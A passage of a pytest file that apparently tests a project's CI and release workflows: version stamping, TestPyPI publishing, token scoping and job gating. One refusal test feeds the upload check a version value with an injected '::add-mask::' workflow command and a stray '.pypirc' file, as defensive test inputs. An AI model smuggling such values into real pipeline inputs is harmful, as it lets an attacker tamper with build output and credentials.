        assert build.index("carries the stamping script") < build.index("dev_version.py stamp")

    def test_the_gui_job_stamps_the_wheel_it_uploads_as_dev_build_stamps_its_own(
        self, tree: Path
    ) -> None:
        """20:M16. The gui job uploads a wheel of every commit ci runs on, and it said it was the
        last release. Its step runs the script on its own checkout with the run's number and the
        commit it built - for a pull request, the merge it tests - so the tree it builds from
        states the version dev-build's would, and names that commit."""
        (tree / "tools").mkdir()
        shutil.copyfile(ROOT / "tools" / "dev_version.py", tree / "tools" / "dev_version.py")
        stamps = [
            found
            for found in steps_of(job(CI_WORKFLOW, "gui"))
            if "name: Stamp the development version\n" in found
        ]
        assert len(stamps) == 1, "the gui job does not stamp the wheel it uploads"
        ran = run_step(stamps[0], tree, GITHUB_RUN_NUMBER="57", GITHUB_SHA=COMMIT)
        assert ran.returncode == 0, ran.stdout + ran.stderr
        assert ran.stdout == "1.2.4.dev57\n"
        project = tomllib.loads((tree / "pyproject.toml").read_text(encoding="utf-8"))["project"]
        assert (project["version"], project["urls"]["Commit"]) == ("1.2.4.dev57", COMMIT_URL)
        package = (tree / "src" / "ddd" / "__init__.py").read_text(encoding="utf-8")
        assert '__version__ = "1.2.4.dev57"' in package.splitlines()
        module = (tree / "cmake" / "Ddd.cmake").read_text(encoding="utf-8")
        assert 'set(DDD_MODULE_VERSION "1.2.4.dev57")' in module.splitlines()

    def test_every_wheel_ci_builds_is_stamped_before_it_is_built(self) -> None:
        """20:M16. Between releases ``master`` states the last release's version, so a wheel ci
        built of it said it was that release - to ``ddd --version``, to the banner of every file
        it generated, to the module's handshake and to pip - while holding every commit since.
        Every job of ``ci.yml`` that builds a wheel stamps its checkout first, in every run in
        which it builds one; Publish, building the release, never does."""
        contexts = [
            ci_run("push", "refs/heads/master"),
            ci_run("pull_request", "refs/pull/5/merge"),
            ci_run("workflow_dispatch", "refs/heads/feature"),
            ci_run("push", "refs/heads/master", os="Windows"),
            publish_run("release", "refs/tags/v0.12.0", called=True),
        ]
        built = []
        for name in job_names(CI_WORKFLOW):
            steps = steps_of(job(CI_WORKFLOW, name))
            conditions = [setting(found, "if", 0) or setting(found, "if", 8) for found in steps]
            stamps = [at for at, found in enumerate(steps) if "tools/dev_version.py stamp" in found]
            for at, found in enumerate(steps):
                if not re.search(r"^ *python -m build\b", found, re.M):
                    continue
                built.append(name)
                for context in contexts:
                    if holds(conditions[at], context):
                        assert any(
                            holds(conditions[stamp], context) for stamp in stamps if stamp < at
                        ), f"{name} builds a wheel it has not stamped, in {context['github']}"
        assert sorted(built) == ["dev-build", "gui"]
        assert "dev_version" not in uncommented(PUBLISH_WORKFLOW)

    def test_the_page_says_every_wheel_ci_builds_is_stamped_and_what_another_carries(
        self,
    ) -> None:
        """20:M16, where the maintainer reads it: which wheels ci stamps, what that refuses, and
        what a wheel built anywhere else says it is."""
        said = flattened(PAGES["docs/developer_documentation.rst"])
        claims = {
            "the gui leg stamps": "On the ubuntu leg of the workflow's own runs it then stamps a "
            "development version into its checkout, as ``dev-build`` stamps its own",
            "what its wheel says": "under a version that says it is a build of that commit and "
            "not a release",
            "a candidate's number": "After a release candidate it is the next candidate's: after "
            "``0.11.0rc1``, run 57 publishes ``0.11.0rc2.dev57``",
            "where it sorts": "which sorts after the candidate and before both of what can "
            "follow it, ``0.11.0rc2`` and ``0.11.0``",
            "what is refused": "The script refuses a version it cannot number after: an alpha "
            "or a beta, and a development, post or local release",
            "a candidate's stamp": "A release candidate it numbers, so its stamp fails no job on "
            "one.",
            "the extension's version": "The extension's manifest states the version too, held "
            "equal to ``__version__`` by a test, and ``0.12.0rc1`` is no semver version, which "
            "semver would spell ``0.12.0-rc.1``",
            "what npm does": "npm installs a manifest of that version as it is",
            "what may fail": "whether vsce packages one is untried, so a candidate stated on "
            "``master`` may still fail the ``extension`` job, in ci's own runs and in Publish's, "
            "before anything is uploaded",
            "every wheel ci builds": "Every wheel ci builds is stamped so, and no other.",
            "the gui's number": "with ``dev-build``'s run number, and naming the commit it was "
            "built from - for a pull request, the merge ``gui`` tests, where ``dev-build`` builds "
            "the head",
            "when the two differ": "Each is numbered after the version its own commit states: "
            "the two are one on a push, and on a pull request they part only where its head and "
            "the merge it is tested as state two versions - a branch cut before a release's "
            "commit, say - and not on the release's own pull request, whose head and merge both "
            "state the release.",
            "a local build": "A wheel built anywhere else, by ``python -m build`` in a checkout, "
            "carries the version its ``pyproject.toml`` states",
            "master's version": "``master`` states the last release's until the next release "
            "commit",
            "what it says it is": "holds every commit since that release and says it is that "
            "release",
            "no commit": "its metadata names no commit",
            "only the release": "Only the release's own build, from its tag, is the release.",
            "the pages' section": "uploads the wheel as ``ddd-tool-<commit>``, stamped as a "
            "development build of that commit",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"the developer page no longer says {missing}"
        assert "so a candidate on ``master`` fails no job" not in said
        assert "numbered as ``dev-build``'s of the same run" not in said

    def test_a_candidate_s_spelling_is_no_semver_version(self) -> None:
        """What the page says of the extension's manifest under a candidate, held to semver
        2.0.0's own grammar: PEP 440's ``0.12.0rc1`` is no version there, ``0.12.0-rc.1`` is one,
        and the manifest is held equal to ``__version__`` by
        ``test_the_editor_extension_carries_the_same_version``."""
        identifier = r"(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)"
        semver = re.compile(
            rf"(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)(?:-{identifier}(?:\.{identifier})*)?"
            r"(?:\+[0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*)?"
        )
        assert semver.fullmatch("0.12.0rc1") is None
        assert semver.fullmatch("0.12.0-rc.1") is not None

    def test_the_two_builds_of_a_run_read_one_commit_on_a_push_alone(self) -> None:
        """What the page says of the two wheels' numbers: ``dev-build`` stamps the commit it
        names, a pull request's own head, and ``gui`` the commit the run checked out, the merge
        it tests. On a push the two are one commit; on a pull request, two."""
        named = re.search(r"^      COMMIT: (.+)$", job(CI_WORKFLOW, "dev-build"), re.M)
        assert named is not None, "dev-build no longer names the commit it builds"
        assert 'stamp "$GITHUB_RUN_NUMBER" "$COMMIT"' in job(CI_WORKFLOW, "dev-build")
        stamping = [
            found
            for found in steps_of(job(CI_WORKFLOW, "gui"))
            if "name: Stamp the development version\n" in found
        ]
        assert len(stamping) == 1, "the gui job does not stamp the wheel it uploads"
        assert 'stamp "$GITHUB_RUN_NUMBER" "$GITHUB_SHA"' in stamping[0]
        push = ci_run("push", "refs/heads/master")
        assert text_of(evaluated(named.group(1), push)) == push["github"]["sha"]
        request = ci_run("pull_request", "refs/pull/5/merge")
        request["github"]["event"]["pull_request"]["head"]["sha"] = COMMIT
        assert text_of(evaluated(named.group(1), request)) == COMMIT
        assert request["github"]["sha"] != COMMIT

    @pytest.mark.parametrize(
        ("head", "merge", "one"),
        [("0.12.0", "0.12.0", True), ("0.11.0", "0.12.0", False)],
        ids=["the release's own pull request", "a branch cut before the release's commit"],
    )
    def test_a_pull_request_s_two_wheels_share_a_number_where_its_head_and_merge_agree(
        self, tmp_path: Path, head: str, merge: str, one: bool
    ) -> None:
        """Each job's own stamp step, run on a tree of the commit it stamps: ``dev-build`` on the
        head it checks out, ``gui`` on the merge it tests. Each numbers its wheel after the
        version its tree states, so the two share a number where the head and the merge state
        one version, as on the release's own pull request, and not where they state two, as on
        a branch cut before the release's commit."""
        builds = [
            found
            for found in steps_of(job(CI_WORKFLOW, "gui"))
            if "name: Stamp the development version\n" in found
        ]
        assert len(builds) == 1, "the gui job does not stamp the wheel it uploads"
        stamped = {}
        for name, version, stamping, commit in (
            (
                "dev-build",
                head,
                step(job(CI_WORKFLOW, "dev-build"), "Stamp the development version"),
                "COMMIT",
            ),
            ("gui", merge, builds[0], "GITHUB_SHA"),
        ):
            where = self.stating(tmp_path / name, version)
            (where / "tools").mkdir()
            shutil.copyfile(ROOT / "tools" / "dev_version.py", where / "tools" / "dev_version.py")
            variables = {"GITHUB_RUN_NUMBER": "57", commit: COMMIT, "GITHUB_OUTPUT": "output"}
            ran = run_step(stamping, where, **variables)
            assert ran.returncode == 0, ran.stdout + ran.stderr
            stamped[name] = tomllib.loads((where / "pyproject.toml").read_text(encoding="utf-8"))[
                "project"
            ]["version"]
        assert stamped == {
            "dev-build": dev_version.next_development(head, 57),
            "gui": dev_version.next_development(merge, 57),
        }
        assert (stamped["dev-build"] == stamped["gui"]) is one

    @pytest.mark.parametrize(
        "version", ["0.10.1.dev57", "0.12.0rc2.dev57"], ids=["after a release", "after a candidate"]
    )
    def test_the_upload_is_this_runs_two_files(self, tmp_path: Path, version: str) -> None:
        check = step(job(CI_WORKFLOW, "dev-publish"), "Check what is about to be published")
        passed = run_step(
            check,
            self.dist(
                tmp_path, f"ddd_tool-{version}-py3-none-any.whl", f"ddd_tool-{version}.tar.gz"
            ),
            VERSION=version,
            GITHUB_RUN_NUMBER="57",
        )
        assert passed.returncode == 0, passed.stdout + passed.stderr

    @pytest.mark.parametrize(
        ("version", "names"),
        [
            ("0.10.1.dev57", [WHEEL, SDIST, "ddd_tool-0.10.1.dev60-py3-none-any.whl"]),
            (
                "0.10.1.dev56",
                ["ddd_tool-0.10.1.dev56-py3-none-any.whl", "ddd_tool-0.10.1.dev56.tar.gz"],
            ),
            ("0.10.1.dev57", [WHEEL]),
            ("0.10.1.dev57", [WHEEL, SDIST, ".pypirc"]),
            ("0.10.1.dev57", [f"{WHEEL}/", SDIST]),
            ("0.10.1.dev57\n::add-mask::0.10.1.dev57", [WHEEL, SDIST]),
            (
                "0.12.0a2.dev57",
                ["ddd_tool-0.12.0a2.dev57-py3-none-any.whl", "ddd_tool-0.12.0a2.dev57.tar.gz"],
            ),
        ],
        ids=[
            "a wheel for a later run",
            "the version of another run",
            "no sdist",
            "a hidden file",
            "a directory for a wheel",
            "a version spanning lines",
            "an alpha's build, which the stamp never numbers",
        ],
    )
    def test_anything_else_is_refused_before_the_upload(
        self, tmp_path: Path, version: str, names: list[str]
    ) -> None:
        """Everything ``dev-build`` hands over was made where the pages' packages ran their
        install scripts, so the job holding the token takes none of it on trust: a file for a
        later run would be uploaded under that run's version and its own upload then refused,
        and a version from another run - a renamed ``ci.yml`` restarts the numbers - would
        point the summary at a build of another commit. Nothing it prints can start a line."""
        check = step(job(CI_WORKFLOW, "dev-publish"), "Check what is about to be published")
        refused = run_step(
            check, self.dist(tmp_path, *names), VERSION=version, GITHUB_RUN_NUMBER="57"
        )
        assert refused.returncode == 1, refused.stdout + refused.stderr
        assert refused.stdout.startswith("::error::")
        assert "\n::add-mask::" not in refused.stdout

    def test_the_install_lines_are_written_from_what_was_checked(self, tmp_path: Path) -> None:
        """Both lines users copy are written by the job that checked what they name: the
        version it checked, and the requirements it read off the checked wheel and held to a
        pattern. Nothing of it is taken from ``dev-build`` unchecked."""
        publish = job(CI_WORKFLOW, "dev-publish")
        summary = step(publish, "Say what was published, and how it installs")
        wrote = run_step(
            summary,
            tmp_path,
            VERSION="0.10.1.dev57",
            DEPENDENCIES='pip install "jinja2<4,>=3.1" "pydantic<3,>=2.7"',
            COMMIT=COMMIT,
            GITHUB_SERVER_URL="https://github.com",
            GITHUB_REPOSITORY="Sauci/ddd",
            GITHUB_STEP_SUMMARY="summary.md",
        )
        assert wrote.returncode == 0, wrote.stdout + wrote.stderr
        said = (tmp_path / "summary.md").read_text(encoding="utf-8")
        assert "ddd-tool 0.10.1.dev57" in said
        assert COMMIT_URL in said
        assert [line for line in said.splitlines() if line.startswith("pip install")] == [
            'pip install "jinja2<4,>=3.1" "pydantic<3,>=2.7"',
            "pip install --no-deps --index-url https://test.pypi.org/simple/ "
            "ddd-tool==0.10.1.dev57",
        ]
        assert "anybody can upload a lookalike" in said
        checked = "VERSION: ${{ needs.dev-build.outputs.version }}"
        assert checked in step(publish, "Check what is about to be published")
        assert checked in step(publish, "Read the requirements off the checked wheel")
        assert checked in summary
        assert "DEPENDENCIES: ${{ steps.requirements.outputs.line }}" in summary
        order = [
            publish.index("- name: Check what is about to be published"),
            publish.index("- name: Read the requirements off the checked wheel"),
            publish.index("uses: pypa/gh-action-pypi-publish"),
            publish.index("- name: Say what was published, and how it installs"),
        ]
        assert order == sorted(order), "the checks, the upload and the summary are out of order"

    def test_only_this_repository_publishes_one(self) -> None:
        """A fork's pull request is given no token, and a fork's own push has no publisher on
        TestPyPI: both skip the build rather than failing the upload after it. ``dev-publish``
        needs ``dev-build``, so it skips with it."""
        condition = re.search(
            r"^    if: >-\n((?:      .*\n)+)", job(CI_WORKFLOW, "dev-build"), re.M
        )
        assert condition is not None, "dev-build no longer says which runs build one"
        said = " ".join(condition.group(1).split())
        assert "github.repository == 'Sauci/ddd'" in said
        assert "github.event_name == 'push' && github.ref == 'refs/heads/master'" in said
        assert "github.event.pull_request.head.repo.full_name == github.repository" in said
        assert "needs: dev-build" in job(CI_WORKFLOW, "dev-publish")

    def test_only_the_job_that_publishes_can_ask_for_a_token(self) -> None:
        """``npm ci`` runs the install scripts of every package the pages depend on, and a build
        runs whatever its backend is: the publishing action's own documentation asks for the
        build and the upload to be separate jobs, and for the token on the second alone, which
        is how publish.yml has it too. The second checks nothing out and installs nothing, so no
        code of the repository runs beside the token: its python is the runner's own, reading
        the workflow's own lines on its standard input."""
        granted = [line for line in uncommented(CI_WORKFLOW).splitlines() if "id-token:" in line]
        assert len(granted) == 1, f"ci.yml is to grant a token once, and grants {granted}"
        publish = uncommented(job(CI_WORKFLOW, "dev-publish"))
        assert "id-token: write" in publish, (
            "the one job that may ask for a token is not dev-publish"
        )
        for code in ("actions/checkout", "setup-python", "tools/", "npm ", " -m "):
            assert code not in publish, f"dev-publish runs {code.strip()}"
        # The summary prints an install line; running one is another thing.
        assert not re.search(r"^\s*(?:- )?(?:run: )?pip ", publish, re.M), "dev-publish runs pip"
        pythons = [publish[found.start() :] for found in re.finditer(r"\bpython", publish)]
        assert pythons, "no python is recognised in dev-publish, so this weighs nothing"
        assert all(python.startswith(("python3 - ", "python3 -I - ")) for python in pythons), (
            "dev-publish runs a python program other than the lines the workflow hands it"
        )

    def test_it_publishes_to_testpypi_alone_from_the_environment_the_page_registers(self) -> None:
        """An upload without ``repository-url`` goes to pypi.org. And only a re-run may pass
        over a file already there: on a first attempt that file came from another run - planted
        by one, or published by a ``ci.yml`` renamed since, whose numbers have restarted - and
        passing over it in silence would leave the run's summary naming somebody else's build."""
        publish = uncommented(job(CI_WORKFLOW, "dev-publish"))
        assert "repository-url: https://test.pypi.org/legacy/" in publish
        assert "skip-existing: ${{ github.run_attempt != '1' }}" in publish
        environment = re.search(r"environment:\n\s+name: ([\w-]+)", publish)
        assert environment is not None, "dev-publish names no environment for the publisher"
        assert environment.group(1) == "testpypi-dev"
        assert f"``{environment.group(1)}``" in PAGES["docs/developer_documentation.rst"]


class TestTheCiRun:
    """What part 19a asked of ci.yml (spec §4): the journeys on three legs, a timeout on every
    job, and a manual run that repeats the journeys and runs nothing else."""

    def test_every_job_has_a_timeout(self) -> None:
        """GitHub's own default is 360 minutes: a gui job once hung 24 of them installing a
        browser, and would have held the run, and any re-run of its failed jobs, for the rest.
        Each job's own limit, as ci.yml states it; ``None`` would be a job that has none. The
        gui legs take 30 minutes on an ordinary run, and 150 on a hunt (``inputs.repeat`` above
        1); the test legs 40, the windows ones taking 15.9 to 20.9 minutes in CI runs 43664431438
        and 43667157867."""
        limits = {}
        for name in job_names(CI_WORKFLOW):
            limit = re.search(r"^    timeout-minutes: (.+)$", job(CI_WORKFLOW, name), re.M)
            limits[name] = None if limit is None else limit.group(1)
        assert limits == {
            "test": "40",
            "lint": "10",
            "container": "20",
            "extension": "15",
            "gui": "${{ inputs.repeat > 1 && 150 || 30 }}",
            "gui-screenshots": "20",
            "dev-build": "25",
            "dev-publish": "10",
        }

    def test_the_journeys_run_on_three_legs(self) -> None:
        legs = re.findall(r"- os: (\S+)\n\s+browser: (\S+)", uncommented(job(CI_WORKFLOW, "gui")))
        assert sorted(legs) == [
            ("ubuntu-latest", "chromium"),
            ("windows-latest", "chromium"),
            ("windows-latest", "msedge"),
        ]

    def test_edge_is_the_runner_s_own_and_the_install_is_bounded(self) -> None:
        """Ten minutes (ruling P19a-6): a stalled download still fails in minutes, and a healthy
        install on the windows chromium leg took 2 m 54 s in run 37688993981 and 3 m 36 s in run
        37695365124, 3 m 19 s of it --with-deps installing Media Foundation - five would fail a
        slow day's."""
        install = step(job(CI_WORKFLOW, "gui"), "Install Playwright's Chromium")
        assert "if: matrix.browser == 'chromium'" in install
        assert re.findall(r"^ +timeout-minutes: (.+)$", install, re.M) == ["10"]
        journeys = step(job(CI_WORKFLOW, "gui"), "Run the journeys")
        assert "PLAYWRIGHT_CHANNEL: ${{ matrix.browser == 'msedge' && 'msedge' || '' }}" in journeys

    def test_the_manual_run_asks_how_many_times(self) -> None:
        dispatch = CI_WORKFLOW.split("\n  workflow_dispatch:", 1)[1].split("\npermissions:", 1)[0]
        assert "repeat:" in dispatch
        assert "type: number" in dispatch
        assert "default: 1" in dispatch

    def test_a_hunt_repeats_every_journey(self) -> None:
        journeys = step(job(CI_WORKFLOW, "gui"), "Run the journeys")
        assert "npm run e2e -- --repeat-each=${{ inputs.repeat || 1 }}" in journeys

    def test_a_hunt_runs_the_journeys_alone(self) -> None:
        """Every job but the gui legs is skipped by a hunt; the development build already
        publishes nothing on a manual run (``test_only_this_repository_publishes_one``)."""
        alone = {"gui", "dev-build", "dev-publish"}
        unskipped = [
            name
            for name in job_names(CI_WORKFLOW)
            if name not in alone
            and "\n    if: ${{ !(inputs.repeat > 1) }}\n" not in job(CI_WORKFLOW, name)
        ]
        assert unskipped == [], f"these jobs would run during a hunt: {unskipped}"

    @pytest.mark.parametrize("repeat", [1, 5], ids=["an ordinary dispatch", "a hunt"])
    def test_a_dispatch_s_repeat_decides_what_runs(self, repeat: int) -> None:
        """Read over a dispatch as the runner reads it: a repeat of 1, the default, is an ordinary
        run, every job but the development builds, which publish nothing on a dispatch; above
        1 it is a hunt, and only the gui legs run."""
        context = ci_run("workflow_dispatch", "refs/heads/feature", repeat=repeat)
        names = job_names(CI_WORKFLOW)
        ran = [name for name in names if job_runs(CI_WORKFLOW, name, context)]
        ordinary = [name for name in names if name not in ("dev-build", "dev-publish")]
        assert ran == (["gui"] if repeat > 1 else ordinary)

    def test_the_job_s_name_carries_its_browser(self) -> None:
        """Two of the three legs share windows-latest, chromium and msedge: without the
        browser in its name, a run's job list would show two legs both called
        "gui (windows-latest)", and a reader - or a later task reading a run's jobs by name -
        could not tell which is which (spec §4: "gui (windows-latest, msedge)")."""
        assert "name: gui (${{ matrix.os }}, ${{ matrix.browser }})" in job(CI_WORKFLOW, "gui")

    def test_the_failure_report_s_name_carries_the_browser_too(self) -> None:
        """The same two legs, chromium and msedge on windows-latest: with the pre-existing
        playwright-report-${{ matrix.os }} alone, both would upload their report under that
        one name, and overwrite: true lets whichever leg finishes last silently discard the
        other's diagnostic report."""
        gui = job(CI_WORKFLOW, "gui")
        assert "- if: failure()\n" in gui, "the gui job no longer uploads a report on failure"
        upload = gui.split("- if: failure()\n", 1)[1]
        assert "name: playwright-report-${{ matrix.os }}-${{ matrix.browser }}" in upload

    def test_the_windows_chromium_leg_maps_a_drive_for_its_journey(self) -> None:
        mapped = step(job(CI_WORKFLOW, "gui"), "Map a drive for the mapped-drive journey")
        assert "if: runner.os == 'Windows' && matrix.browser == 'chromium'" in mapped
        assert "New-SmbShare" in mapped and "net use M:" in mapped
        assert "DDD_MAPPED_DRIVE=M:" in mapped
        # A PowerShell script, and a share the journey can write to: it edits the copy it serves,
        # and finds every file named under this network path (mapped.spec.ts), mapped for this
        # logon alone. The directory shared is made first, in the runner's own temporary one.
        assert "shell: pwsh" in mapped
        assert "-FullAccess" in mapped
        assert r"net use M: \\localhost\ddd-mapped /persistent:no" in mapped
        assert '$shared = Join-Path $env:RUNNER_TEMP "ddd-mapped"' in mapped
        assert "New-Item -ItemType Directory -Path $shared" in mapped

    def test_the_drive_is_named_to_the_journeys_that_follow(self) -> None:
        """Broken any of these ways, mapped.spec.ts is left out where it was to run, and the leg
        passes without it: the drive named to the mapping step alone rather than to the steps
        after it, or named only once the journeys have run, or under another name than the one
        playwright.config.ts chooses the journey by."""
        gui = job(CI_WORKFLOW, "gui")
        mapped = step(gui, "Map a drive for the mapped-drive journey")
        assert '"DDD_MAPPED_DRIVE=M:" | Out-File -FilePath $env:GITHUB_ENV -Append' in mapped
        assert gui.index("- name: Map a drive for the mapped-drive journey") < gui.index(
            "- name: Run the journeys"
        )
        config = (ROOT / "gui" / "playwright.config.ts").read_text(encoding="utf-8")
        assert 'testIgnore: process.env.DDD_MAPPED_DRIVE ? [] : ["**/mapped.spec.ts"]' in config


def publish_run(
    event_name: str, ref: str, target: str = "", run_id: str = "43", *, called: bool = False
) -> dict[str, Any]:
    """The context a run of Publish gives its jobs, on the ubuntu runner they all run on - or,
    ``called``, the context it gives ``ci.yml``, which it calls. GitHub documents a called
    workflow as given its caller's ``github`` context, with the caller's name in
    ``github.workflow``, and as ``inputs`` only those the call passes, which Publish passes none
    of. A dispatch of Publish has its ``target``; a release, no input at all."""
    return {
        "github": {
            "event_name": event_name,
            "ref": ref,
            "ref_name": ref.split("/", 2)[2],
            "sha": TAGGED,
            "run_id": run_id,
            "workflow": "Publish",
            "repository": "Sauci/ddd",
            "event": {},
        },
        "runner": {"os": "Linux"},
        "inputs": {"target": target} if event_name == "workflow_dispatch" and not called else {},
    }


def ci_run(
    event_name: str, ref: str, run_id: str = "44", os: str = "Linux", repeat: int = 1
) -> dict[str, Any]:
    """The context a run of ``ci.yml`` started by an event of its own gives a job on one runner:
    its own name, CI, in ``github.workflow``, a dispatch's ``repeat``, by default its default,
    and a pull request from a branch of this repository."""
    context: dict[str, Any] = {
        "github": {
            "event_name": event_name,
            "ref": ref,
            "ref_name": ref.split("/", 2)[2],
            "sha": MASTER_HEAD,
            "run_id": run_id,
            "workflow": "CI",
            "repository": "Sauci/ddd",
            "event": {},
        },
        "runner": {"os": os},
        "inputs": {"repeat": repeat} if event_name == "workflow_dispatch" else {},
    }
    if event_name == "pull_request":
        head = {"repo": {"full_name": "Sauci/ddd"}}
        context["github"]["event"] = {"pull_request": {"head": head}}
    return context


PUBLISH_RUNS = {
    "a release": ("release", "refs/tags/v0.12.0", ""),
    "a dry run": ("workflow_dispatch", "refs/heads/master", "testpypi"),
    "a dispatch from a release's tag": ("workflow_dispatch", "refs/tags/v0.12.0", "pypi"),
}
"""The runs Publish makes, each by its event, its ref and the target a dispatch is given."""


class TestWhatPublishRunsBeforeItUploads:
    """20:M4. Publish ran the python suite again before it built a release, on one of ci's six
    cells, and none of the page's own gates. It now calls ``ci.yml`` whole, on the release's
    commit, and builds once every job of it has passed; then it installs what it built, and
    checks the installation before anything is handed on. The conditions are read over the
    context GitHub documents a called workflow as given (``publish_run(..., called=True)``), as
    the runner evaluates them."""

    @staticmethod
    def concurrency(context: dict[str, Any]) -> tuple[Any, Any]:
        """``ci.yml``'s concurrency group, and whether it cancels the run in progress: an
        expression evaluated, or a literal ``true`` or ``false`` read as YAML reads it."""
        top = CI_WORKFLOW.split("\nconcurrency:\n", 1)[1].split("\n\n", 1)[0] + "\n"
        group, cancels = setting(top, "group", 2), setting(top, "cancel-in-progress", 2)
        assert group is not None and cancels is not None, "ci.yml has no concurrency group"
        literal = {"true": True, "false": False}.get(cancels)
        cancelling = evaluated(cancels, context) if literal is None else literal
        return evaluated(group, context), cancelling

    def test_a_release_calls_ci_whole_before_its_build(self) -> None:
        """Called rather than copied, so that the two cannot drift; with no inputs, so that no
        run of Publish is a hunt; and waited for by the build."""
        call = job(PUBLISH_WORKFLOW, "ci")
        assert setting(call, "uses", 4) == "./.github/workflows/ci.yml"
        assert "\n    with:" not in call, "Publish passes ci.yml inputs, which make a hunt"
        assert "workflow_call" in events(CI_WORKFLOW), "ci.yml cannot be called"
        assert setting(job(PUBLISH_WORKFLOW, "build"), "needs", 4) == "ci"

    @pytest.mark.parametrize(
        ("event_name", "ref", "target"), PUBLISH_RUNS.values(), ids=list(PUBLISH_RUNS)
    )
    def test_every_job_of_ci_runs_for_publish_but_the_development_builds(
        self, event_name: str, ref: str, target: str
    ) -> None:
        """Each gate is a job of Publish's run, and its build waits on all of them: a job a
        release skips counts as passed, so none of them may be skipped. The development builds
        are no gates, and none may run for a release: dev-build runs on a push or a pull
        request alone, and dev-publish only after it."""
        called = publish_run(event_name, ref, target, called=True)
        ran = {name: job_runs(CI_WORKFLOW, name, called) for name in job_names(CI_WORKFLOW)}
        assert ran == {name: name not in ("dev-build", "dev-publish") for name in ran}
        assert job_runs(PUBLISH_WORKFLOW, "build", publish_run(event_name, ref, target))

    def test_a_release_s_gates_are_alone_in_a_group_of_their_own(self) -> None:
        """Publish's run has the release's tag for its ref, as a dispatch of Publish or of
        ``ci.yml`` from that tag has: in one group that cancels the run in progress, the later
        would cancel the release's gates halfway, or the release the later's. Named after
        Publish's run, the group is shared with no other run, and cancels nothing."""
        release = publish_run("release", "refs/tags/v0.12.0", run_id="43", called=True)
        others = [
            publish_run("release", "refs/tags/v0.12.0", run_id="47", called=True),
            publish_run("workflow_dispatch", "refs/tags/v0.12.0", "pypi", "45", called=True),
            publish_run("workflow_dispatch", "refs/heads/master", "testpypi", "46", called=True),
            ci_run("workflow_dispatch", "refs/tags/v0.12.0"),
            ci_run("push", "refs/heads/master"),
        ]
        group, cancels = self.concurrency(release)
        assert cancels is False
        assert group not in {self.concurrency(other)[0] for other in others}

    @pytest.mark.parametrize(
        ("context", "group"),
        [
            (ci_run("push", "refs/heads/master"), "ci-refs/heads/master"),
            (ci_run("pull_request", "refs/pull/5/merge"), "ci-refs/pull/5/merge"),
            (ci_run("workflow_dispatch", "refs/heads/feature"), "ci-refs/heads/feature"),
        ],
        ids=["a push to master", "a pull request", "a dispatch"],
    )
    def test_ci_s_own_runs_keep_their_group(self, context: dict[str, Any], group: str) -> None:
        """A newer run of a ref cancels the one in progress, as it always has."""
        assert self.concurrency(context) == (group, True)

    def test_the_call_allows_what_ci_s_jobs_ask_for_and_nothing_more(self) -> None:
        """GitHub documents a called workflow as able to lower the permissions it is given, and
        never to raise them, and ``dev-publish`` asks for ``id-token: write``: the call allows
        what the jobs of ``ci.yml`` ask for, and nothing they do not, while ``ci.yml``'s own
        ``permissions`` hold every job that asks for nothing to reading."""
        asked: set[str] = set()
        for block in re.finditer(r"^( *)permissions:\n((?:\1  \S.*\n)+)", CI_WORKFLOW, re.M):
            asked |= {line.split("#")[0].strip() for line in block.group(2).splitlines()}
        call = job(PUBLISH_WORKFLOW, "ci") + "\n"
        allowed = re.search(r"^    permissions:\n((?:      \S.*\n)+)", call, re.M)
        assert allowed is not None, "the call allows ci.yml only what Publish allows itself"
        assert {line.split("#")[0].strip() for line in allowed.group(1).splitlines()} == asked
        assert asked == {"contents: read", "id-token: write"}

    def test_the_gui_job_builds_its_wheel_in_ci_s_own_runs_alone(self) -> None:
        """In Publish's run the build job builds the wheel it ships, then installs and checks
        it: a wheel of the gui job there would be a second one of the release's commit."""
        wheel = [
            step
            for step in steps_of(job(CI_WORKFLOW, "gui"))
            if re.search(r"dev_version\.py stamp|-m build|static/index\.html|name: ddd-tool-", step)
        ]
        assert len(wheel) == 4, "the gui job's wheel is no longer stamped, built, checked, uploaded"
        for context, built in [
            (ci_run("push", "refs/heads/master"), True),
            (ci_run("pull_request", "refs/pull/5/merge"), True),
            (ci_run("push", "refs/heads/master", os="Windows"), False),
            (publish_run("release", "refs/tags/v0.12.0", called=True), False),
        ]:
            assert [holds(setting(step, "if", 0), context) for step in wheel] == [built] * 4

    def test_the_wheel_is_installed_and_checked_before_it_is_handed_on(self) -> None:
        """Into a fresh environment, from the file the upload jobs are handed, its dependencies
        from the index; then held to the wheel by ``tools/installed_wheel.py``, through the
        ``ddd`` that installation put on its path, before the artifact is uploaded."""
        build = job(PUBLISH_WORKFLOW, "build")
        install = step(build, "Install the wheel into a fresh environment")
        assert 'python -m venv "$RUNNER_TEMP/installed"' in install
        assert '"$RUNNER_TEMP/installed/bin/python" -m pip install dist/*.whl' in install
        check = step(build, "Check the installed wheel answers as the release")
        assert (
            'python -I tools/installed_wheel.py dist/*.whl "$version" '
            '"$RUNNER_TEMP/installed/bin/ddd"'
        ) in check
        order = [
            build.index("run: python -m build"),
            build.index("- name: Check tag matches package version"),
            build.index("- name: Install the wheel into a fresh environment"),
            build.index("- name: Check the installed wheel answers as the release"),
            build.index("uses: actions/upload-artifact"),
        ]
        assert order == sorted(order), "the wheel is handed on before it is installed and checked"

    @pytest.mark.parametrize(
        ("event_name", "ref", "checked"),
        [
            ("release", "refs/tags/v0.12.0", "0.12.0"),
            ("workflow_dispatch", "refs/tags/v0.12.0", "0.12.0"),
            ("workflow_dispatch", "refs/heads/master", "0.0.1"),
        ],
        ids=["a release", "a dispatch from a release's tag", "a dry run from a branch"],
    )
    def test_the_installation_is_held_to_the_tag_s_version(
        self, tmp_path: Path, event_name: str, ref: str, checked: str
    ) -> None:
        """On a release, or a dispatch from a ``v`` tag, ``ddd --version`` has to answer the tag's
        version; a dry run from a branch has no tag, and is held to ``pyproject.toml``'s. Here
        ``pyproject.toml`` states another version than the tag, to tell the two apart: in a run,
        the tag check before this step refuses such a tag. The runner's directory is given as a
        relative one: Git Bash, which runs the step on windows, rewrites an argument starting
        with ``/`` into a windows path before python sees it."""
        (tmp_path / "pyproject.toml").write_text('[project]\nversion = "0.0.1"\n', encoding="utf-8")
        (tmp_path / "tools").mkdir()
        (tmp_path / "tools" / "installed_wheel.py").write_text(
            "import sys\nprint(sys.argv[1:])\n", encoding="utf-8"
        )
